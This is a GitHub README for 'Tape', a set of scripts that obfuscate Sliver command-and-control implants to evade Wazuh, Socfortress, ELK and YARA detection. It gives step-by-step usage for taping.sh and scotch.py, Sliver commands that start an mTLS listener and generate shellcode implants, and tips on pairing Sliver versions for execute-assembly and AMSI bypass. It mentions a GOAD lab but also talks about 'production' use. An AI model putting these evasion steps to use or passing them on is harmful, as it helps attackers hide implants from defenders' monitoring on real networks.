# Tape
Scotch-Tape usage for [Sliver](https://github.com/BishopFox/sliver) obfsucation  
This technique looks a bit like this ...
<p align="center">
  <img src="./image/jim-carrey-tape.gif" alt="jimmy-jim width="290" height="290" />
</p>  


## In Labs - GOAD with Wazuh Activated    
1. Yes, I know that just tweaking some settings in Havoc allows the demon.bin to be executed on GOAD (on Socfortress rules machines) without issues. But in this case, my goal was to achieve the same thing manually with [Sliver](https://github.com/BishopFox/sliver), which allowed me to learn much more about this C2.
And for Havoc, if you didn't know—now you know.    
2. In this case, we will bypass and obfuscate our payload with minimal effort. (If my calculations are correct: Socfortress—out, ELK rules—out, Wazuh YARA rules—out. I’m not considering Defender in my equation because some built-in bypasses in the implant can still be flagged, even in this case.)  

## Taping.sh
1. Fork [Sliver](https://github.com/BishopFox/sliver) to your own repository.  
2. Clone the repo on your server.  
3. Place this [Tape](https://github.com/Oni-kuki/Tape) repo in front of your forked [Sliver](https://github.com/BishopFox/sliver) repo (on your server, of course)
4. Execute [Taping.sh](https://github.com/Oni-kuki/Tape/blob/main/taping.sh)

> [!NOTE]  
> Version 1.5 or 1.6 are reference to [Sliver](https://github.com/BishopFox/sliver) version
> 1.6 is still in development so use it with caution (do not use it in production).  
> I have a better solution if you want to use the latest version because Donut-based payloads in 1.6 are not flagged as much yet.   

```taping.sh
./taping.sh version 1.5 FOLDER/
./taping.sh version 1.6 FOLDER/
```

> [!CAUTION]  
> This takes a while, so be patient  
> I highly recommend reading the script, because it's necessary to make some modification on it, in link with your fork  

## Scotch.py  
This script can be used independently of this repo, (if you have read the [Taping.sh](https://github.com/Oni-kuki/Tape/blob/main/taping.sh) you'll notice some redundancy in the obfuscation techniques.)  

```
python3 scotch.py FILE
```

> [!CAUTION] 
> Depending on your listener, not every obfuscation technique can be applied. By default, the obfuscation is set for an mTLS listener.   
> So again Read the script

```sliver
mtls -L HOST_IP -l port -p
generate -m HOST_IP:PORT -G --skip-symbols -f shellcode -s ./FOLDER/TO/SAVE
```
## Last but not Least  
I don't have automated one particular obfuscation (wireguard strings because it's still a bit tricky)  
You can make it manually with ghidra for the moment, I will automated in a few days.

## Some Recomendations
> [!NOTE]
> Build the 1.5 version   
> Next to this build the 1.6 version  
> Add the sliver-server binary of 1.6 to the 1.5 server, like external builder and use it for every implant generation  

### Why did I make this ? 
Because the Donut loader in version 1.6 doesn't allow the execute-assembly method to work correctly.
I tested a lot of things to understand why, and I isolated the fact that the loader cannot retrieve the output. This might be linked to the AMSI patch (the bypasses are applied in two ways: one for Donut itself, (for implant) and the other in the loader for execute-assembly). However, I haven't delved too deeply into the subject yet.  

Regardless, version 1.6 is quieter for the implant, while version 1.5 works better for execute-assembly. In any case, version 1.5 is more stable and production-ready.  
